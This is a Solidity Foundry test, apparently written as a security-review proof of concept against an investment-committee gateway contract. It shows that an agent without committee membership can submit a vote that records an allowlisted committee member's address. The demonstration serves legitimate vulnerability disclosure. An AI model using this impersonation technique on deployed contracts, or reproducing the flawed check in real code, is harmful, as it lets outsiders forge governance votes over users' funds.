// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ICGatewayIntegration} from "./ICGatewayIntegration.t.sol";
import {IInvestmentCommitteePolicy} from "../gateway/interfaces/IInvestmentCommitteePolicy.sol";
import {InvestmentCommitteePolicy} from "../gateway/InvestmentCommitteePolicy.sol";
import {IGateway} from "../gateway/interfaces/IGateway.sol";

contract SecurityReviewCommitteePoc is ICGatewayIntegration {
    function test_permissionlessAgentCanImpersonateCommitteeMember() public {
        address otherAgent = address(0xB2);
        // A gateway agent without committee membership can submit a vote
        // carrying the allowlisted committeeAgent's address in calldata.
        address[] memory empty = new address[](0);
        IGateway.AgentPolicy memory policy = IGateway.AgentPolicy({
            active: true,
            validUntil: uint64(block.timestamp + 30 days),
            maxPerPayment: 1e6,
            maxPerWindow: 10e6,
            shareReceiver: otherAgent,
            allowedDestinations: empty,
            assetRecipient: address(0),
            maxWithdrawPerPayment: 0,
            maxWithdrawPerWindow: 0,
            allowedSourceVaults: empty
        });
        bytes32 salt = keccak256("review-permissionless-agent");
        bytes32 commitment = keccak256(abi.encode(otherAgent, otherAgent, salt));
        vm.prank(otherAgent);
        gateway.commitAuthorization(commitment);
        vm.roll(block.number + 1);
        vm.prank(otherAgent);
        gateway.revealAuthorization(otherAgent, salt, policy);
        IInvestmentCommitteePolicy.VoteParams memory p = _defaultVoteParams();
        vm.prank(otherAgent);
        gateway.committeeVoteSubmit(p);
        InvestmentCommitteePolicy.Vote memory v = ic.getVote(0);
        assertEq(v.agent, committeeAgent);
        assertFalse(ic.hasRole(ic.COMMITTEE_AGENT_ROLE(), otherAgent));
    }
}
